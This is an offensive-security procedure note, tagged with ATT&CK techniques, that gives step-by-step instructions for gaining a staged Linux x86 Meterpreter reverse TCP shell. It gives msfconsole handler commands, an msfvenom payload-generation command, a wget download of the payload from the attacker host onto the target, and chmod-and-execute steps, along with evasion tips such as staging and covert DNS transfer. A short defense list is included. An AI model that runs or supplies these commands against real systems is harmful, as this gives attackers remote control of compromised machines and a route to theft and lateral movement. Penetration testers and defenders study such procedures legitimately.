---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - >-
    [[techniques/Custom Cryptographic Protocol|T1024 - Custom Cryptographic
    Protocol]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - linux-staged-reverse-tcp
  - meterpreter-shell
  - reverse-shell
commands:
  - '[[commands/msfvenom-generate-linux-x86-meterpreter-reverse-tcp]]'
  - '[[commands/bash-chmod-and-execute-elf-payload]]'
tools:
  - '[[tools/Metasploit-Framework]]'
platforms:
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Linux-Staged-Reverse-TCP-Meterpreter-Shell

## Summary

This procedure details the generation of a staged reverse TCP Meterpreter payload for Linux x86 systems using msfvenom, configuration of a listener with msfconsole, transfer to a target, and execution to establish a full Meterpreter session. The staged approach delivers a small initial stager that downloads the larger Meterpreter stage, aiding in evasion of detection by reducing the payload size transmitted initially.

## Description

The Linux Staged Reverse TCP Meterpreter Shell leverages the Metasploit Framework to create a command-and-control (C2) channel from a compromised Linux system back to the attacker's machine. The stager is a compact ELF binary that connects to the attacker, downloads the full Meterpreter payload over the network, and executes it in memory. This technique is useful in post-exploitation scenarios where initial access has been gained (e.g., via a vulnerability or phishing), allowing remote command execution, file transfer, privilege escalation, and lateral movement. The custom protocol used by Meterpreter helps bypass basic network filters. Target environment: Linux x86 systems with network outbound access to the attacker's IP/port. Expected outcomes include a interactive Meterpreter prompt for further actions.

## Requirements

1. Metasploit Framework installed on the attacker's machine (Kali Linux recommended).
2. Knowledge of the target's network configuration to ensure outbound connections to the attacker's IP and port are possible.
3. Initial access to the target Linux system for payload transfer (e.g., via SSH, web upload, or existing foothold).
4. Target must be Linux x86 architecture; no dependencies on the target beyond standard libc.

## Defense

- Keep Linux systems fully patched to mitigate initial access vectors that enable payload execution.
- Monitor network traffic for suspicious outbound connections to uncommon ports or IPs, using tools like Suricata or Zeek.
- Implement application whitelisting and restrict execution of unknown ELF binaries via SELinux or AppArmor.
- Enable endpoint detection and response (EDR) tools to monitor for Meterpreter-like behaviors, such as process injection or unusual network patterns.
- Log and alert on msfvenom-generated artifacts or ELF files with suspicious entropy.

## Objectives

1. Establish a persistent remote shell session on the compromised Linux system.
2. Enable command execution, file manipulation, and further post-exploitation activities via Meterpreter.
3. Demonstrate evasion techniques through staged payload delivery to avoid large single-payload transfers.

## Instructions

### Step 1: Configure and Start the Multi/Handler Listener

**Context**: This step sets up the Metasploit multi/handler to listen for the incoming reverse connection from the target. It uses the background mode (-j) to run non-interactively while allowing multiple sessions.

**Code** ([[codes/msfconsole-configure-multi-handler-for-linux-meterpreter]]):

```msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST $_LHOST
set LPORT $_LPORT
exploit -j
```

> Run this sequence in an msfconsole session on the attacker's machine. The handler will bind to the specified IP and port, waiting for the stager to connect and download the full payload. Expected output includes confirmation messages like "[*] Started reverse TCP handler on $_LHOST:$_LPORT" and "[*] Backgrounding the job...".

### Step 2: Generate the Staged Payload

**Context**: Use msfvenom to create the initial stager ELF binary, which is small (typically ~300 bytes) and connects back to the listener to fetch the full Meterpreter stage. This step occurs on the attacker's machine.

**Command** ([[commands/msfvenom-generate-linux-x86-meterpreter-reverse-tcp]]):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f elf > reverse.elf
```

> The command specifies the Linux x86 reverse TCP Meterpreter payload, outputs in ELF format suitable for Linux executables, and redirects to a file. Verify the file size with `ls -l reverse.elf` to confirm generation (should be small for staging). If the command fails, check Metasploit installation and network reachability.

### Step 3: Transfer the Payload to the Target

**Context**: Deliver the generated reverse.elf to the compromised Linux system. This assumes prior initial access; methods vary based on the foothold (e.g., upload via web shell, wget from a controlled server, or SCP if credentials are available).

Instructions: Host the file on an attacker-controlled web server and use a command like `wget http://$_LHOST/reverse.elf` on the target, or transfer via existing channels. Ensure the file lands in an executable directory like /tmp. Decision point: If firewall blocks HTTP, use DNS or other covert channels for transfer.

Expected Output: File present on target, verifiable with `ls -l /tmp/reverse.elf`.

### Step 4: Execute the Payload on the Target

**Context**: On the target Linux system, make the ELF executable and run it. This initiates the reverse connection, triggering the stager to download and execute the full Meterpreter payload from the listener.

**Command** ([[commands/bash-chmod-and-execute-elf-payload]]):

```bash
chmod +x $_PAYLOAD_FILE && ./$_PAYLOAD_FILE
```

> Run as a low-privilege user initially; the payload will connect back silently if successful. No output is expected on the target console upon success. Monitor the attacker's msfconsole for the incoming session.

## Expected Output

Upon successful execution, the attacker's msfconsole will display: "[*] Sending stage (37 bytes) to $_TARGET_IP" followed by "[*] Meterpreter session 1 opened ($_TARGET_IP:$_LPORT -> $_LHOST:$_LPORT)". The prompt changes to "meterpreter >", indicating a fully interactive session ready for commands like `sysinfo`, `shell`, or `upload`.
